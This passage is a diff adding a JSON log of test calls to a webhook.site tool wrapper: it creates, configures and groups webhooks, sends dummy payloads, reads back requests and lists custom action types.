@@ -1,0 +1,4002 @@
+{
+ "calls": [
+  {
+   "seq": 1,
+   "tool": "create_webhook",
+   "args": {},
+   "result": {
+    "success": true,
+    "message": "Webhook created! Send requests to: https://webhook.site/5f00600b-6562-4360-beb8-f83ea0c69260",
+    "token": "5f00600b-6562-4360-beb8-f83ea0c69260",
+    "alias": null,
+    "url": "https://webhook.site/5f00600b-6562-4360-beb8-f83ea0c69260",
+    "subdomain_url": "https://5f00600b-6562-4360-beb8-f83ea0c69260.webhook.site",
+    "api_url": "https://webhook.site/token/5f00600b-6562-4360-beb8-f83ea0c69260",
+    "email": "5f00600b-6562-4360-beb8-f83ea0c69260@email.webhook.site",
+    "dns": "5f00600b-6562-4360-beb8-f83ea0c69260.dnshook.site",
+    "premium": true,
+    "expires_at": null,
+    "default_status": 200,
+    "default_content": "This URL has no default content configured. <a href=\"https://webhook.site/#!/edit/5f00600b-6562-4360-beb8-f83ea0c69260\">Change response in Webhook.site</a>.",
+    "default_content_type": "text/html",
+    "timeout": 0,
+    "listen": 0,
+    "cors": false,
+    "actions": false,
+    "request_limit": null,
+    "group_id": null,
+    "description": null,
+    "created_at": "2026-09-03 20:12:31",
+    "updated_at": "2026-09-03 20:12:31",
+    "latest_request_at": null,
+    "requests_count": null
+   }
+  },
+  {
+   "seq": 2,
+   "tool": "configure_webhook",
+   "args": {
+    "alias": "mcp-check-5f00600b",
+    "default_status": 201,
+    "default_content": "{\"ok\":true}",
+    "default_content_type": "application/json",
+    "cors": true
+   },
+   "result": {
+    "success": true,
+    "message": "Webhook created with custom config! URL: https://webhook.site/mcp-check-5f00600b",
+    "token": "d8e907cf-2a2e-4da6-95da-9f7ef08e90c2",
+    "alias": "mcp-check-5f00600b",
+    "url": "https://webhook.site/mcp-check-5f00600b",
+    "subdomain_url": "https://d8e907cf-2a2e-4da6-95da-9f7ef08e90c2.webhook.site",
+    "api_url": "https://webhook.site/token/d8e907cf-2a2e-4da6-95da-9f7ef08e90c2",
+    "email": "d8e907cf-2a2e-4da6-95da-9f7ef08e90c2@email.webhook.site",
+    "dns": "d8e907cf-2a2e-4da6-95da-9f7ef08e90c2.dnshook.site",
+    "premium": true,
+    "expires_at": null,
+    "default_status": 201,
+    "default_content": "{\"ok\": true}",
+    "default_content_type": "application/json",
+    "timeout": 0,
+    "listen": 0,
+    "cors": true,
+    "actions": false,
+    "request_limit": null,
+    "group_id": null,
+    "description": null,
+    "created_at": "2026-09-03 20:12:31",
+    "updated_at": "2026-09-03 20:12:31",
+    "latest_request_at": null,
+    "requests_count": null,
+    "applied_settings": {
+     "default_status": 201,
+     "default_content": "{\"ok\": true}",
+     "default_content_type": "application/json",
+     "cors": true,
+     "alias": "mcp-check-5f00600b"
+    }
+   }
+  },
+  {
+   "seq": 3,
+   "tool": "configure_webhook",
+   "args": {
+    "webhook_token": "d8e907cf-2a2e-4da6-95da-9f7ef08e90c2",
+    "default_status": 203,
+    "request_limit": 100,
+    "timeout": 1
+   },
+   "result": {
+    "success": true,
+    "message": "Webhook settings updated successfully",
+    "token": "d8e907cf-2a2e-4da6-95da-9f7ef08e90c2",
+    "alias": "mcp-check-5f00600b",
+    "url": "https://webhook.site/mcp-check-5f00600b",
+    "subdomain_url": "https://d8e907cf-2a2e-4da6-95da-9f7ef08e90c2.webhook.site",
+    "api_url": "https://webhook.site/token/d8e907cf-2a2e-4da6-95da-9f7ef08e90c2",
+    "email": "d8e907cf-2a2e-4da6-95da-9f7ef08e90c2@email.webhook.site",
+    "dns": "d8e907cf-2a2e-4da6-95da-9f7ef08e90c2.dnshook.site",
+    "premium": true,
+    "expires_at": null,
+    "default_status": 203,
+    "default_content": "",
+    "default_content_type": "text/plain",
+    "timeout": 1,
+    "listen": 0,
+    "cors": false,
+    "actions": false,
+    "request_limit": 100,
+    "group_id": null,
+    "description": null,
+    "created_at": "2026-09-03 20:12:31",
+    "updated_at": "2026-09-03 20:12:31",
+    "latest_request_at": null,
+    "requests_count": null,
+    "updated_settings": {
+     "default_status": 203,
+     "timeout": 1,
+     "request_limit": 100
+    }
+   }
+  },
+  {
+   "seq": 4,
+   "tool": "get_webhook_info",
+   "args": {
+    "webhook_token": "d8e907cf-2a2e-4da6-95da-9f7ef08e90c2"
+   },
+   "result": {
+    "success": true,
+    "message": "Webhook information retrieved",
+    "token": "d8e907cf-2a2e-4da6-95da-9f7ef08e90c2",
+    "alias": "mcp-check-5f00600b",
+    "url": "https://webhook.site/mcp-check-5f00600b",
+    "subdomain_url": "https://d8e907cf-2a2e-4da6-95da-9f7ef08e90c2.webhook.site",
+    "api_url": "https://webhook.site/token/d8e907cf-2a2e-4da6-95da-9f7ef08e90c2",
+    "email": "d8e907cf-2a2e-4da6-95da-9f7ef08e90c2@email.webhook.site",
+    "dns": "d8e907cf-2a2e-4da6-95da-9f7ef08e90c2.dnshook.site",
+    "premium": true,
+    "expires_at": null,
+    "default_status": 203,
+    "default_content": "",
+    "default_content_type": "text/plain",
+    "timeout": 1,
+    "listen": 0,
+    "cors": false,
+    "actions": false,
+    "request_limit": 100,
+    "group_id": null,
+    "description": null,
+    "created_at": "2026-09-03 20:12:31",
+    "updated_at": "2026-09-03 20:12:31",
+    "latest_request_at": null,
+    "requests_count": null,
+    "premium_expires_at": null
+   }
+  },
+  {
+   "seq": 5,
+   "tool": "get_webhook_email",
+   "args": {
+    "webhook_token": "5f00600b-6562-4360-beb8-f83ea0c69260",
+    "validate": true
+   },
+   "result": {
+    "success": true,
+    "message": "Webhook email: 5f00600b-6562-4360-beb8-f83ea0c69260@email.webhook.site",
+    "token": "5f00600b-6562-4360-beb8-f83ea0c69260",
+    "email": "5f00600b-6562-4360-beb8-f83ea0c69260@email.webhook.site",
+    "url": "https://webhook.site/5f00600b-6562-4360-beb8-f83ea0c69260"
+   }
+  },
+  {
+   "seq": 6,
+   "tool": "list_webhooks",
+   "args": {
+    "per_page": 100,
+    "max_items": 500
+   },
+   "result": {
+    "success": true,
+    "message": "Retrieved 4 webhooks",
+    "webhooks": [
+     {
+      "token": "5f00600b-6562-4360-beb8-f83ea0c69260",
+      "alias": null,
+      "url": "https://webhook.site/5f00600b-6562-4360-beb8-f83ea0c69260",
+      "subdomain_url": "https://5f00600b-6562-4360-beb8-f83ea0c69260.webhook.site",
+      "api_url": "https://webhook.site/token/5f00600b-6562-4360-beb8-f83ea0c69260",
+      "email": "5f00600b-6562-4360-beb8-f83ea0c69260@email.webhook.site",
+      "dns": "5f00600b-6562-4360-beb8-f83ea0c69260.dnshook.site",
+      "premium": true,
+      "expires_at": null,
+      "default_status": 200,
+      "default_content": "This URL has no default content configured. <a href=\"https://webhook.site/#!/edit/5f00600b-6562-4360-beb8-f83ea0c69260\">Change response in Webhook.site</a>.",
+      "default_content_type": "text/html",
+      "timeout": 0,
+      "listen": 0,
+      "cors": false,
+      "actions": false,
+      "request_limit": null,
+      "group_id": null,
+      "description": null,
+      "created_at": "2026-09-03 20:12:31",
+      "updated_at": "2026-09-03 20:12:31",
+      "latest_request_at": null,
+      "requests_count": null
+     },
+     {
+      "token": "93a2c2f6-4228-4c4c-963d-d7de8a36bb40",
+      "alias": null,
+      "url": "https://webhook.site/93a2c2f6-4228-4c4c-963d-d7de8a36bb40",
+      "subdomain_url": "https://93a2c2f6-4228-4c4c-963d-d7de8a36bb40.webhook.site",
+      "api_url": "https://webhook.site/token/93a2c2f6-4228-4c4c-963d-d7de8a36bb40",
+      "email": "93a2c2f6-4228-4c4c-963d-d7de8a36bb40@email.webhook.site",
+      "dns": "93a2c2f6-4228-4c4c-963d-d7de8a36bb40.dnshook.site",
+      "premium": true,
+      "expires_at": null,
+      "default_status": 200,
+      "default_content": "This URL has no default content configured. <a href=\"https://webhook.site/#!/edit/93a2c2f6-4228-4c4c-963d-d7de8a36bb40\">Change response in Webhook.site</a>.",
+      "default_content_type": "text/html",
+      "timeout": 0,
+      "listen": 0,
+      "cors": false,
+      "actions": false,
+      "request_limit": null,
+      "group_id": null,
+      "description": null,
+      "created_at": "2026-09-03 19:43:37",
+      "updated_at": "2026-09-03 19:44:04",
+      "latest_request_at": "2026-09-03 19:44:04",
+      "requests_count": null
+     },
+     {
+      "token": "d8e907cf-2a2e-4da6-95da-9f7ef08e90c2",
+      "alias": "mcp-check-5f00600b",
+      "url": "https://webhook.site/mcp-check-5f00600b",
+      "subdomain_url": "https://d8e907cf-2a2e-4da6-95da-9f7ef08e90c2.webhook.site",
+      "api_url": "https://webhook.site/token/d8e907cf-2a2e-4da6-95da-9f7ef08e90c2",
+      "email": "d8e907cf-2a2e-4da6-95da-9f7ef08e90c2@email.webhook.site",
+      "dns": "d8e907cf-2a2e-4da6-95da-9f7ef08e90c2.dnshook.site",
+      "premium": true,
+      "expires_at": null,
+      "default_status": 203,
+      "default_content": "",
+      "default_content_type": "text/plain",
+      "timeout": 1,
+      "listen": 0,
+      "cors": false,
+      "actions": false,
+      "request_limit": 100,
+      "group_id": null,
+      "description": null,
+      "created_at": "2026-09-03 20:12:31",
+      "updated_at": "2026-09-03 20:12:33",
+      "latest_request_at": "2026-09-03 20:12:33",
+      "requests_count": null
+     },
+     {
+      "token": "eb170872-58e9-480a-83d6-c0cc2fe63aa2",
+      "alias": null,
+      "url": "https://webhook.site/eb170872-58e9-480a-83d6-c0cc2fe63aa2",
+      "subdomain_url": "https://eb170872-58e9-480a-83d6-c0cc2fe63aa2.webhook.site",
+      "api_url": "https://webhook.site/token/eb170872-58e9-480a-83d6-c0cc2fe63aa2",
+      "email": "eb170872-58e9-480a-83d6-c0cc2fe63aa2@email.webhook.site",
+      "dns": "eb170872-58e9-480a-83d6-c0cc2fe63aa2.dnshook.site",
+      "premium": true,
+      "expires_at": null,
+      "default_status": 200,
+      "default_content": "This URL has no default content configured. <a href=\"https://webhook.site/#!/edit/eb170872-58e9-480a-83d6-c0cc2fe63aa2\">Change response in Webhook.site</a>.",
+      "default_content_type": "text/html",
+      "timeout": 0,
+      "listen": 0,
+      "cors": false,
+      "actions": false,
+      "request_limit": null,
+      "group_id": null,
+      "description": null,
+      "created_at": "2026-09-02 20:50:33",
+      "updated_at": "2026-09-03 17:36:26",
+      "latest_request_at": null,
+      "requests_count": null
+     }
+    ],
+    "pagination": {
+     "total": null,
+     "per_page": null,
+     "current_page": null,
+     "last_page": null,
+     "is_last_page": null,
+     "pages_fetched": 1,
+     "returned": 4,
+     "truncated": false
+    }
+   }
+  },
+  {
+   "seq": 7,
+   "tool": "manage_groups",
+   "args": {
+    "action": "create",
+    "name": "mcp-check-5f0060"
+   },
+   "result": {
+    "success": true,
+    "message": "Group created",
+    "group": {
+     "name": "mcp-check-5f0060",
+     "team_id": 64829,
+     "updated_at": "2026-09-03T20:12:33.000000Z",
+     "created_at": "2026-09-03T20:12:33.000000Z",
+     "id": 3658
+    }
+   }
+  },
+  {
+   "seq": 8,
+   "tool": "configure_webhook",
+   "args": {
+    "webhook_token": "d8e907cf-2a2e-4da6-95da-9f7ef08e90c2",
+    "group_id": 3658
+   },
+   "result": {
+    "success": true,
+    "message": "Webhook settings updated successfully",
+    "token": "d8e907cf-2a2e-4da6-95da-9f7ef08e90c2",
+    "alias": "mcp-check-5f00600b",
+    "url": "https://webhook.site/mcp-check-5f00600b",
+    "subdomain_url": "https://d8e907cf-2a2e-4da6-95da-9f7ef08e90c2.webhook.site",
+    "api_url": "https://webhook.site/token/d8e907cf-2a2e-4da6-95da-9f7ef08e90c2",
+    "email": "d8e907cf-2a2e-4da6-95da-9f7ef08e90c2@email.webhook.site",
+    "dns": "d8e907cf-2a2e-4da6-95da-9f7ef08e90c2.dnshook.site",
+    "premium": true,
+    "expires_at": null,
+    "default_status": 200,
+    "default_content": "",
+    "default_content_type": "text/plain",
+    "timeout": 0,
+    "listen": 0,
+    "cors": false,
+    "actions": false,
+    "request_limit": 100,
+    "group_id": 3658,
+    "description": null,
+    "created_at": "2026-09-03 20:12:31",
+    "updated_at": "2026-09-03 20:12:33",
+    "latest_request_at": "2026-09-03 20:12:33",
+    "requests_count": null,
+    "updated_settings": {
+     "group_id": 3658
+    }
+   }
+  },
+  {
+   "seq": 9,
+   "tool": "manage_groups",
+   "args": {
+    "action": "update",
+    "group_id": 3658,
+    "name": "mcp-check-5f0060-renamed"
+   },
+   "result": {
+    "success": true,
+    "message": "Group updated",
+    "group": {
+     "id": 3658,
+     "team_id": 64829,
+     "name": "mcp-check-5f0060-renamed",
+     "created_at": "2026-09-03T20:12:33.000000Z",
+     "updated_at": "2026-09-03T20:12:34.000000Z"
+    }
+   }
+  },
+  {
+   "seq": 10,
+   "tool": "manage_groups",
+   "args": {
+    "action": "list"
+   },
+   "result": {
+    "success": true,
+    "message": "Retrieved 1 groups",
+    "groups": [
+     {
+      "id": 3658,
+      "team_id": 64829,
+      "name": "mcp-check-5f0060-renamed",
+      "created_at": "2026-09-03T20:12:33.000000Z",
+      "updated_at": "2026-09-03T20:12:34.000000Z"
+     }
+    ],
+    "pagination": {
+     "total": 1,
+     "per_page": 15,
+     "current_page": 1,
+     "last_page": 1,
+     "is_last_page": true,
+     "pages_fetched": 1,
+     "returned": 1,
+     "truncated": false
+    }
+   }
+  },
+  {
+   "seq": 11,
+   "tool": "send_requests",
+   "args": {
+    "webhook_token": "5f00600b-6562-4360-beb8-f83ea0c69260",
+    "data": {
+     "event": "one",
+     "link": "https://example.com/verify?token=abc&u=1"
+    },
+    "headers": {
+     "X-Check": "1"
+    }
+   },
+   "result": {
+    "success": true,
+    "message": "Sent 1/1 requests successfully",
+    "total": 1,
+    "success_count": 1,
+    "fail_count": 0,
+    "results": [
+     {
+      "index": 0,
+      "success": true,
+      "status_code": 200
+     }
+    ]
+   }
+  },
+  {
+   "seq": 12,
+   "tool": "send_requests",
+   "args": {
+    "webhook_token": "5f00600b-6562-4360-beb8-f83ea0c69260",
+    "payloads": [
+     {
+      "n": 1
+     },
+     {
+      "n": 2
+     }
+    ],
+    "method": "PUT",
+    "delay_ms": 100
+   },
+   "result": {
+    "success": true,
+    "message": "Sent 2/2 requests successfully",
+    "total": 2,
+    "success_count": 2,
+    "fail_count": 0,
+    "results": [
+     {
+      "index": 0,
+      "success": true,
+      "status_code": 200
+     },
+     {
+      "index": 1,
+      "success": true,
+      "status_code": 200
+     }
+    ]
+   }
+  },
+  {
+   "seq": 13,
+   "tool": "get_webhook_requests",
+   "args": {
+    "webhook_token": "5f00600b-6562-4360-beb8-f83ea0c69260",
+    "limit": 2,
+    "page": 1
+   },
+   "result": {
+    "success": true,
+    "message": "Retrieved 2 requests",
+    "total_requests": 2,
+    "requests": [
+     {
+      "uuid": "99cbe53f-e41b-4f39-9aa0-bd94d1535aa4",
+      "type": "web",
+      "method": "POST",
+      "content": "{\"event\":\"one\",\"link\":\"https://example.com/verify?token=abc&u=1\"}",
+      "text_content": null,
+      "headers": {
+       "content-length": [
+        "65"
+       ],
+       "x-check": [
+        "1"
+       ],
+       "api-key": [
+        "00000000-0000-4000-8000-0000000000ee"
+       ],
+       "content-type": [
+        "application/json"
+       ],
+       "accept": [
+        "application/json"
+       ],
+       "user-agent": [
+        "python-httpx/0.28.1"
+       ],
+       "accept-encoding": [
+        "gzip, deflate, br"
+       ],
+       "host": [
+        "webhook.site"
+       ]
+      },
+      "query": null,
+      "url": "https://webhook.site/5f00600b-6562-4360-beb8-f83ea0c69260",
+      "ip": "203.0.113.10",
+      "created_at": "2026-09-03 20:12:34"
+     },
+     {
+      "uuid": "ef31a894-d678-4f2f-ba2e-7e22fd8d4f38",
+      "type": "web",
+      "method": "PUT",
+      "content": "{\"n\":1}",
+      "text_content": null,
+      "headers": {
+       "content-length": [
+        "7"
+       ],
+       "api-key": [
+        "00000000-0000-4000-8000-0000000000ee"
+       ],
+       "content-type": [
+        "application/json"
+       ],
+       "accept": [
+        "application/json"
+       ],
+       "user-agent": [
+        "python-httpx/0.28.1"
+       ],
+       "accept-encoding": [
+        "gzip, deflate, br"
+       ],
+       "host": [
+        "webhook.site"
+       ]
+      },
+      "query": null,
+      "url": "https://webhook.site/5f00600b-6562-4360-beb8-f83ea0c69260",
+      "ip": "203.0.113.10",
+      "created_at": "2026-09-03 20:12:34"
+     }
+    ],
+    "pagination": {
+     "total": 4,
+     "per_page": 2,
+     "current_page": 1,
+     "last_page": null,
+     "is_last_page": false,
+     "pages_fetched": 1,
+     "returned": 2,
+     "truncated": false
+    }
+   }
+  },
+  {
+   "seq": 14,
+   "tool": "get_webhook_requests",
+   "args": {
+    "webhook_token": "5f00600b-6562-4360-beb8-f83ea0c69260",
+    "limit": 2,
+    "page": 2
+   },
+   "result": {
+    "success": true,
+    "message": "Retrieved 2 requests",
+    "total_requests": 2,
+    "requests": [
+     {
+      "uuid": "1e044a60-4851-4e8c-81b5-a92a574d9f54",
+      "type": "web",
+      "method": "PUT",
+      "content": "{\"n\":2}",
+      "text_content": null,
+      "headers": {
+       "content-length": [
+        "7"
+       ],
+       "api-key": [
+        "00000000-0000-4000-8000-0000000000ee"
+       ],
+       "content-type": [
+        "application/json"
+       ],
+       "accept": [
+        "application/json"
+       ],
+       "user-agent": [
+        "python-httpx/0.28.1"
+       ],
+       "accept-encoding": [
+        "gzip, deflate, br"
+       ],
+       "host": [
+        "webhook.site"
+       ]
+      },
+      "query": null,
+      "url": "https://webhook.site/5f00600b-6562-4360-beb8-f83ea0c69260",
+      "ip": "203.0.113.10",
+      "created_at": "2026-09-03 20:12:34"
+     },
+     {
+      "uuid": "80e4fca4-9248-48eb-be19-fbfe0d4c749f",
+      "type": "web",
+      "method": "POST",
+      "content": "",
+      "text_content": null,
+      "headers": {
+       "content-type": [
+        "multipart/form-data; boundary=a9883211097c1eb771a8a5867a434a6f"
+       ],
+       "content-length": [
+        "190"
+       ],
+       "user-agent": [
+        "python-httpx/0.28.1"
+       ],
+       "accept-encoding": [
+        "gzip, deflate, br"
+       ],
+       "accept": [
+        "*/*"
+       ],
+       "host": [
+        "webhook.site"
+       ]
+      },
+      "query": null,
+      "url": "https://webhook.site/5f00600b-6562-4360-beb8-f83ea0c69260",
+      "ip": "203.0.113.10",
+      "created_at": "2026-09-03 20:12:35",
+      "attachments": [
+       {
+        "field": "report",
+        "file_id": "436a929c-6736-4ad8-84a8-6a15b6a1b24c",
+        "filename": "report.txt",
+        "size": 16,
+        "content_type": "text/plain"
+       }
+      ]
+     }
+    ],
+    "pagination": {
+     "total": 4,
+     "per_page": 2,
+     "current_page": 2,
+     "last_page": null,
+     "is_last_page": true,
+     "pages_fetched": 1,
+     "returned": 2,
+     "truncated": false
+    }
+   }
+  },
+  {
+   "seq": 15,
+   "tool": "search_requests",
+   "args": {
+    "webhook_token": "5f00600b-6562-4360-beb8-f83ea0c69260",
+    "query": "method:PUT",
+    "limit": 10
+   },
+   "result": {
+    "success": true,
+    "message": "Found 2 matching requests",
+    "query": "method:PUT",
+    "total_found": 2,
+    "requests": [
+     {
+      "uuid": "1e044a60-4851-4e8c-81b5-a92a574d9f54",
+      "type": "web",
+      "method": "PUT",
+      "content": "{\"n\":2}",
+      "text_content": null,
+      "headers": {
+       "content-length": [
+        "7"
+       ],
+       "api-key": [
+        "00000000-0000-4000-8000-0000000000ee"
+       ],
+       "content-type": [
+        "application/json"
+       ],
+       "accept": [
+        "application/json"
+       ],
+       "user-agent": [
+        "python-httpx/0.28.1"
+       ],
+       "accept-encoding": [
+        "gzip, deflate, br"
+       ],
+       "host": [
+        "webhook.site"
+       ]
+      },
+      "query": null,
+      "url": "https://webhook.site/5f00600b-6562-4360-beb8-f83ea0c69260",
+      "ip": "203.0.113.10",
+      "created_at": "2026-09-03 20:12:34"
+     },
+     {
+      "uuid": "ef31a894-d678-4f2f-ba2e-7e22fd8d4f38",
+      "type": "web",
+      "method": "PUT",
+      "content": "{\"n\":1}",
+      "text_content": null,
+      "headers": {
+       "content-length": [
+        "7"
+       ],
+       "api-key": [
+        "00000000-0000-4000-8000-0000000000ee"
+       ],
+       "content-type": [
+        "application/json"
+       ],
+       "accept": [
+        "application/json"
+       ],
+       "user-agent": [
+        "python-httpx/0.28.1"
+       ],
+       "accept-encoding": [
+        "gzip, deflate, br"
+       ],
+       "host": [
+        "webhook.site"
+       ]
+      },
+      "query": null,
+      "url": "https://webhook.site/5f00600b-6562-4360-beb8-f83ea0c69260",
+      "ip": "203.0.113.10",
+      "created_at": "2026-09-03 20:12:34"
+     }
+    ],
+    "pagination": {
+     "total": 2,
+     "per_page": 10,
+     "current_page": 1,
+     "last_page": null,
+     "is_last_page": true,
+     "pages_fetched": 1,
+     "returned": 2,
+     "truncated": false
+    }
+   }
+  },
+  {
+   "seq": 16,
+   "tool": "get_request",
+   "args": {
+    "webhook_token": "5f00600b-6562-4360-beb8-f83ea0c69260"
+   },
+   "result": {
+    "success": true,
+    "message": "Latest request retrieved",
+    "request": {
+     "uuid": "80e4fca4-9248-48eb-be19-fbfe0d4c749f",
+     "type": "web",
+     "method": "POST",
+     "content": "",
+     "text_content": null,
+     "headers": {
+      "content-type": [
+       "multipart/form-data; boundary=a9883211097c1eb771a8a5867a434a6f"
+      ],
+      "content-length": [
+       "190"
+      ],
+      "user-agent": [
+       "python-httpx/0.28.1"
+      ],
+      "accept-encoding": [
+       "gzip, deflate, br"
+      ],
+      "accept": [
+       "*/*"
+      ],
+      "host": [
+       "webhook.site"
+      ]
+     },
+     "query": null,
+     "url": "https://webhook.site/5f00600b-6562-4360-beb8-f83ea0c69260",
+     "ip": "203.0.113.10",
+     "created_at": "2026-09-03 20:12:35",
+     "attachments": [
+      {
+       "field": "report",
+       "file_id": "436a929c-6736-4ad8-84a8-6a15b6a1b24c",
+       "filename": "report.txt",
+       "size": 16,
+       "content_type": "text/plain"
+      }
+     ]
+    }
+   }
+  },
+  {
+   "seq": 17,
+   "tool": "get_request",
+   "args": {
+    "webhook_token": "5f00600b-6562-4360-beb8-f83ea0c69260",
+    "request_id": "80e4fca4-9248-48eb-be19-fbfe0d4c749f",
+    "raw": true
+   },
+   "result": {
+    "success": true,
+    "message": "Request retrieved",
+    "request": {
+     "uuid": "80e4fca4-9248-48eb-be19-fbfe0d4c749f",
+     "type": "web",
+     "method": "POST",
+     "content": "",
+     "text_content": null,
+     "headers": {
+      "content-type": [
+       "multipart/form-data; boundary=a9883211097c1eb771a8a5867a434a6f"
+      ],
+      "content-length": [
+       "190"
+      ],
+      "user-agent": [
+       "python-httpx/0.28.1"
+      ],
+      "accept-encoding": [
+       "gzip, deflate, br"
+      ],
+      "accept": [
+       "*/*"
+      ],
+      "host": [
+       "webhook.site"
+      ]
+     },
+     "query": null,
+     "url": "https://webhook.site/5f00600b-6562-4360-beb8-f83ea0c69260",
+     "ip": "203.0.113.10",
+     "created_at": "2026-09-03 20:12:35",
+     "attachments": [
+      {
+       "field": "report",
+       "file_id": "436a929c-6736-4ad8-84a8-6a15b6a1b24c",
+       "filename": "report.txt",
+       "size": 16,
+       "content_type": "text/plain"
+      }
+     ]
+    },
+    "raw_body": "",
+    "raw_content_type": "text/plain; charset=UTF-8",
+    "raw_truncated": false
+   }
+  },
+  {
+   "seq": 18,
+   "tool": "download_request_file",
+   "args": {
+    "webhook_token": "5f00600b-6562-4360-beb8-f83ea0c69260",
+    "request_id": "80e4fca4-9248-48eb-be19-fbfe0d4c749f",
+    "file_id": "436a929c-6736-4ad8-84a8-6a15b6a1b24c"
+   },
+   "result": {
+    "success": true,
+    "message": "Downloaded 16 bytes",
+    "request_id": "80e4fca4-9248-48eb-be19-fbfe0d4c749f",
+    "file_id": "436a929c-6736-4ad8-84a8-6a15b6a1b24c",
+    "content_type": "application/octet-stream",
+    "size": 16,
+    "truncated": false,
+    "content_base64": "aGVsbG8gYXR0YWNobWVudA=="
+   }
+  },
+  {
+   "seq": 19,
+   "tool": "extract_links_from_request",
+   "args": {
+    "webhook_token": "5f00600b-6562-4360-beb8-f83ea0c69260",
+    "request_id": null
+   },
+   "result": {
+    "success": true,
+    "message": "Extracted 0 unique links",
+    "request_id": "80e4fca4-9248-48eb-be19-fbfe0d4c749f",
+    "request_type": "web",
+    "total_links": 0,
+    "filter_domain": null,
+    "verification_codes": [],
+    "links": {
+     "auth_links": [],
+     "api_links": [],
+     "all_links": []
+    }
+   }
+  },
+  {
+   "seq": 20,
+   "tool": "update_request",
+   "args": {
+    "webhook_token": "5f00600b-6562-4360-beb8-f83ea0c69260",
+    "request_id": "80e4fca4-9248-48eb-be19-fbfe0d4c749f",
+    "note": "checked by live_tool_check"
+   },
+   "result": {
+    "success": true,
+    "message": "Request updated",
+    "request_id": "80e4fca4-9248-48eb-be19-fbfe0d4c749f",
+    "note": "checked by live_tool_check",
+    "note_path": "/token/5f00600b-6562-4360-beb8-f83ea0c69260/request/80e4fca4-9248-48eb-be19-fbfe0d4c749f"
+   }
+  },
+  {
+   "seq": 21,
+   "tool": "configure_webhook",
+   "args": {
+    "webhook_token": "5f00600b-6562-4360-beb8-f83ea0c69260",
+    "listen": 5
+   },
+   "result": {
+    "success": true,
+    "message": "Webhook settings updated successfully",
+    "token": "5f00600b-6562-4360-beb8-f83ea0c69260",
+    "alias": null,
+    "url": "https://webhook.site/5f00600b-6562-4360-beb8-f83ea0c69260",
+    "subdomain_url": "https://5f00600b-6562-4360-beb8-f83ea0c69260.webhook.site",
+    "api_url": "https://webhook.site/token/5f00600b-6562-4360-beb8-f83ea0c69260",
+    "email": "5f00600b-6562-4360-beb8-f83ea0c69260@email.webhook.site",
+    "dns": "5f00600b-6562-4360-beb8-f83ea0c69260.dnshook.site",
+    "premium": true,
+    "expires_at": null,
+    "default_status": 200,
+    "default_content": "",
+    "default_content_type": "text/plain",
+    "timeout": 0,
+    "listen": 5,
+    "cors": false,
+    "actions": false,
+    "request_limit": null,
+    "group_id": null,
+    "description": null,
+    "created_at": "2026-09-03 20:12:31",
+    "updated_at": "2026-09-03 20:12:39",
+    "latest_request_at": "2026-09-03 20:12:35",
+    "requests_count": null,
+    "updated_settings": {
+     "listen": 5
+    }
+   }
+  },
+  {
+   "seq": 22,
+   "tool": "get_request",
+   "args": {
+    "webhook_token": "5f00600b-6562-4360-beb8-f83ea0c69260"
+   },
+   "result": {
+    "success": true,
+    "message": "Latest request retrieved",
+    "request": {
+     "uuid": "64fa9234-566f-4736-8341-e33e3751e8f9",
+     "type": "web",
+     "method": "POST",
+     "content": "{\"dynamic\":true}",
+     "text_content": null,
+     "headers": {
+      "content-type": [
+       "application/json"
+      ],
+      "content-length": [
+       "16"
+      ],
+      "user-agent": [
+       "python-httpx/0.28.1"
+      ],
+      "accept-encoding": [
+       "gzip, deflate, br"
+      ],
+      "accept": [
+       "*/*"
+      ],
+      "host": [
+       "webhook.site"
+      ]
+     },
+     "query": null,
+     "url": "https://webhook.site/5f00600b-6562-4360-beb8-f83ea0c69260",
+     "ip": "203.0.113.10",
+     "created_at": "2026-09-03 20:12:39"
+    }
+   }
+  },
+  {
+   "seq": 23,
+   "tool": "update_request",
+   "args": {
+    "webhook_token": "5f00600b-6562-4360-beb8-f83ea0c69260",
+    "request_id": "64fa9234-566f-4736-8341-e33e3751e8f9",
+    "response_content": "answered dynamically",
+    "response_status": 299
+   },
+   "result": {
+    "success": true,
+    "message": "Request updated",
+    "request_id": "64fa9234-566f-4736-8341-e33e3751e8f9",
+    "response_api_status": 3,
+    "response_note": "Accepted. It reaches the caller only if the request is still held by a listen-mode token with the webhook.site CLI attached."
+   }
+  },
+  {
+   "seq": 24,
+   "tool": "configure_webhook",
+   "args": {
+    "webhook_token": "5f00600b-6562-4360-beb8-f83ea0c69260",
+    "listen": 0
+   },
+   "result": {
+    "success": true,
+    "message": "Webhook settings updated successfully",
+    "token": "5f00600b-6562-4360-beb8-f83ea0c69260",
+    "alias": null,
+    "url": "https://webhook.site/5f00600b-6562-4360-beb8-f83ea0c69260",
+    "subdomain_url": "https://5f00600b-6562-4360-beb8-f83ea0c69260.webhook.site",
+    "api_url": "https://webhook.site/token/5f00600b-6562-4360-beb8-f83ea0c69260",
+    "email": "5f00600b-6562-4360-beb8-f83ea0c69260@email.webhook.site",
+    "dns": "5f00600b-6562-4360-beb8-f83ea0c69260.dnshook.site",
+    "premium": true,
+    "expires_at": null,
+    "default_status": 200,
+    "default_content": "",
+    "default_content_type": "text/plain",
+    "timeout": 0,
+    "listen": 0,
+    "cors": false,
+    "actions": false,
+    "request_limit": null,
+    "group_id": null,
+    "description": null,
+    "created_at": "2026-09-03 20:12:31",
+    "updated_at": "2026-09-03 20:12:40",
+    "latest_request_at": "2026-09-03 20:12:39",
+    "requests_count": null,
+    "updated_settings": {
+     "listen": 0
+    }
+   }
+  },
+  {
+   "seq": 25,
+   "tool": "manage_custom_actions",
+   "args": {
+    "action": "types"
+   },
+   "result": {
+    "success": true,
+    "message": "63 action types (verified 2026-09-03)",
+    "types": [
+     {
+      "type": "auth_basic",
+      "description": "Require HTTP Basic auth on the URL.",
+      "required": [
+       "password"
+      ],
+      "optional": [
+       "username"
+      ],
+      "status": "ok"
+     },
+     {
+      "type": "auto_json",
+      "description": "Register every JSON field of the body as a variable (optionally under a name prefix).",
+      "required": [],
+      "optional": [
+       "source",
+       "jsonpath",
+       "variable_name"
+      ],
+      "status": "ok"
+     },
+     {
+      "type": "aws_cf_invalidate",
+      "description": "Aws cf invalidate",
+      "required": [
+       "provider_id",
+       "distribution_id",
+       "paths"
+      ],
+      "optional": [],
+      "status": "needs_provider"
+     },
+     {
+      "type": "aws_s3_create_bucket",
+      "description": "Aws s3 create bucket",
+      "required": [
+       "provider_id",
+       "region",
+       "bucket_name"
+      ],
+      "optional": [
+       "canned_acl"
+      ],
+      "status": "needs_provider"
+     },
+     {
+      "type": "aws_s3_delete_object",
+      "description": "Aws s3 delete object",
+      "required": [
+       "provider_id",
